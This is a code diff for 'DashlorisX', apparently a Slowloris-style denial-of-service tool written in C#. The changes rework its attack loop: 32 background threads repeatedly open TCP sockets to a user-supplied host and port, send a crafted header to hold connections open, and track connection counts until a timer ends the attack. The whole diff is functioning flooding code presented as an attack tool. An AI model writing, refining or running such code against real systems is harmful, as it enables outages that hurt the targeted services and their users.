@@ -24,7 +24,32 @@ namespace DashlorisX
 	readonly AttackLog LogLog = new AttackLog();
 	readonly DashNet DashNet = new DashNet();
 
-	private string GetHeader()
+	private void LogSend(string text) =>
+	    LogLog.TextLog.AppendText($"{text}\r\n");
+
+	private string host = string.Empty;
+	private string port = string.Empty;
+
+	private Socket GetStocking()
+	{
+	    try
+	    {
+		return (new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { Ttl = 255 });
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+	private void SetKeepAlive(bool Enable)
+	{
+	    KeepAlive = (Enable);
+	}
+
+	private bool KeepAlive = false;
+
+	private string GetDashlorisHeader()
 	{
 	    try
 	    {
@@ -73,31 +98,17 @@ namespace DashlorisX
 	    }
 	}
 
-	readonly List<System.Timers.Timer> InnerDashBots = new List<System.Timers.Timer>();
-
-	readonly List<Socket> Stockings = new List<Socket>();
-	readonly List<Thread> DashBots = new List<Thread>();
-
-	string host = string.Empty;
-	string port = string.Empty;
-
 	private void SendHeader(Socket stocking)
-	{   
+	{
 	    try
 	    {
-		stocking.Ttl = 255;
-		
 		var result = stocking.BeginConnect(host, DashNet.GetInteger(port), null, null);
 		var success = result.AsyncWaitHandle.WaitOne(500, true);
-		
+
 		if (stocking.Connected)
 		{
-		    byte[] header = Encoding.ASCII.GetBytes(GetHeader());
-
-		    stocking.Send(header);
+		    stocking.Send(Encoding.ASCII.GetBytes(GetDashlorisHeader()));
 		}
-		
-		Stockings.Add(stocking);
 	    }
 
 	    catch
@@ -106,23 +117,79 @@ namespace DashlorisX
 	    }
 	}
 
-	System.Timers.Timer DashTimer = null;
+	readonly Dictionary<string, int> Statistics = new Dictionary<string, int>() { { "Bots", 0 }, { "Connections", 0 } };
 
-	private void StartTimer()
+	private void UpdateStatistics(string Key, int Value)
 	{
 	    try
 	    {
-		var duration = DashNet.GetInteger(DashlorisX.DurationTextBox.Text) * 1000;
+		if (!Statistics.ContainsKey(Key))
+		{
+		    Statistics.Add(Key, Value);
+		}
 
-		DashTimer = new System.Timers.Timer(duration);
+		else
+		{
+		    Statistics[Key] = Value;
+		}
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+
+	private int GetStatistics(string Key)
+	{
+	    try
+	    {
+		if (Statistics.ContainsKey(Key))
+		{
+		    return Statistics[Key];
+		}
+
+		return -1;
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+
+	private void ResetStatistics()
+	{
+	    try
+	    {
+		UpdateStatistics("Connections", 0);
+		UpdateStatistics("Bots", 0);
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+
+	private System.Timers.Timer DashTimer = null;
+
+	private void StartDashTimer()
+	{
+	    try
+	    {
+		var interval = DashNet.GetInteger(DashlorisX.DurationTextBox.Text);
+
+		DashTimer = new System.Timers.Timer(interval * 1000)
+		{
+		    AutoReset = false,
+		    Enabled = true,
+		};
 
 		DashTimer.Elapsed += (s, e) =>
 		{
 		    StopAttack();
 		};
-
-		DashTimer.AutoReset = false;
-		DashTimer.Enabled = true;
 
 		DashTimer.Start();
 	    }
@@ -132,71 +199,122 @@ namespace DashlorisX
 		throw (ErrorHandler.GetException(E));
 	    }
 	}
-	
-	void LogSend(string text) =>
-	    LogLog.TextLog.AppendText($"{text}\r\n");
 
-	private void StartLatestDashBot()
+	private void StartDashBots()
 	{
-	    if (DashBots.Count > 0)
+	    try
 	    {
-		DashBots[DashBots.Count - 1].IsBackground = true;
-		DashBots[DashBots.Count - 1].Start();
+		new Thread(() =>
+		{
+		    var Stockings = new List<Socket>();
+		    var DashBots = new List<Thread>();
+
+		    for (int k = 0; k < 32; k += 1)//worker integration
+		    {
+			if (KeepAlive)
+			{
+			    DashBots.Add(new Thread(() =>
+			    {
+				while (KeepAlive)
+				{
+				    for (int request = 0; request < 64; request += 1)
+				    {
+					if (KeepAlive)
+					{
+					    Socket Stocking = GetStocking();
+
+					    for (int multiplier = 0; multiplier < 4; multiplier += 1, Stocking = GetStocking())
+					    {
+						SendHeader(Stocking);
+
+						if (Stocking.Connected)
+						{
+						    UpdateStatistics("Connections", Stockings.Count);// Inner Iteration to see how many connections alive, for accuracy.
+						    Stockings.Add(Stocking);
+
+						    continue;
+						}
+
+						Stocking.Dispose();
+					    }
+
+					    Thread.Sleep(2000); // Inner Interval
+					    continue;
+					}
+
+					break;
+				    }
+
+				    if (KeepAlive)
+				    {
+					Thread.Sleep(8000); // Main Interval
+				    }
+				}
+			    }));
+
+			    UpdateStatistics("Bots", k + 1);
+			}
+		    }
+
+		    foreach (var DashBot in DashBots)
+		    {
+			if (KeepAlive)
+			{
+			    DashBot.IsBackground = true;
+			    DashBot.Start();
+
+			    Thread.Sleep(500); // Worker Startup Interval
+			}
+		    }
+
+		    int alive = 0, dead = 0;
+
+		    foreach (var DashBot in DashBots)
+		    {
+			if (DashBot.IsAlive)
+			{
+			    DashBot.Join();
+			    alive += 1;
+			}
+
+			else
+			{
+			    DashBot.Abort();
+			    dead += 1;
+			}
+		    }
+
+		    MessageBox.Show($"Alive Bots: {alive}; Dead Bots: {dead}; Stockings:{Stockings.Count};");
+
+		    foreach (var Stocking in Stockings)
+		    {
+			Stocking.Close();
+		    }
+		})
+
+		{ IsBackground = true }.Start();
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
 	    }
 	}
-
-	private Socket GetSocket() =>
-	    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-
-	private bool KeepAlive = false;
 
 	public void StartAttack()
 	{
 	    try
 	    {
-		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
 		port = DashNet.GetPort(DashlorisX.PortTextBox.Text).ToString();
+		host = DashNet.GetIP(DashlorisX.HostTextBox.Text);
 
-		LogSend("Starting workers ....");
+		LogSend("Starting Dash Bots ...."); // Display amount of specified bots
 
-		KeepAlive = true;
+		SetKeepAlive(true);
+		StartDashBots();
+		StartDashTimer();
 
-		DashBots.Add
-		(
-		    new Thread(() => 
-		    {
-			for (int k = 0; k < 32; k += 1)//worker integration
-			{
-			    var InnerDashBot = new System.Timers.Timer(8000) { AutoReset = true }; //send interval
-
-			    if (!KeepAlive)
-			    {
-				break;
-			    }
-
-			    InnerDashBot.Elapsed += (s, e) =>
-			    {
-				for (int request = 0; request < 64; request += 1)
-				{
-				    for (int multiplier = 0; multiplier < 4; multiplier += 1)
-				    {
-					SendHeader(GetSocket());
-				    }
-
-				    Thread.Sleep(2000);
-				}
-			    };
-
-			    InnerDashBot.Start();
-			    InnerDashBots.Add(InnerDashBot);
-			}
-		    })
-		);
-
-		StartLatestDashBot();
-		StartTimer();
-
-		LogSend("Sending waves and waves of requests ....");
+		LogSend("Sending waves and waves of Dashloris-X Requests ....");
 
 		LogLog.ShowDialog();
 	    }
@@ -214,61 +332,30 @@ namespace DashlorisX
 		AutoReset = false,
 	    };
 
-	    SafeTimer.Start();
-
 	    SafeTimer.Elapsed += (s, e) =>
 	    {
-		DashlorisX.Launch.Text = "Launch";
-		LogLog.Stop.Text = "Stop";
-
+		DashlorisX.Launch.Text = string.Format("Launch"); ;
+		LogLog.Stop.Text = string.Format("Stop");
 		LogLog.Hide();
 	    };
+
+	    SafeTimer.Start();
 	}
 
 	public void StopAttack()
-	{//Asynchronously?
+	{
 	    DashlorisX.Launch.Text = "Stopping ....";
-
-	    LogSend($"Stop signal received, stopping {InnerDashBots.Count} bots and disconnecting {Stockings.Count} connections ....");
 
 	    try
 	    {
-		KeepAlive = false;
+		LogSend($"Stop signal received, stopping {GetStatistics("Bots")} bots and disconnecting {GetStatistics("Connections")} connections ....");
 
-		foreach (var InnerDashBot in InnerDashBots)
+		if (GetStatistics("Bots") > 8 || GetStatistics("Connections") > 132)
 		{
-		    if (InnerDashBot != null)
-		    {
-			InnerDashBot.Dispose();
-		    }
+		    LogSend("Please wait a moment, this may take a second ....");
 		}
 
-		InnerDashBots.Clear();
-
-		foreach (Thread DashBot in DashBots)
-		{
-		    if (DashBot != null)
-		    {
-			DashBot.Abort();
-		    }
-		}
-
-		DashBots.Clear();
-
-		foreach (Socket Stocking in Stockings)
-		{
-		    if (Stocking != null)
-		    {
-			if (Stocking.Connected)
-			{
-			    Stocking.Close();
-			}
-
-			Stocking.Dispose();
-		    }
-		}
-
-		Stockings.Clear();
+		SetKeepAlive(false);
 
 		if (DashTimer != null)
 		{
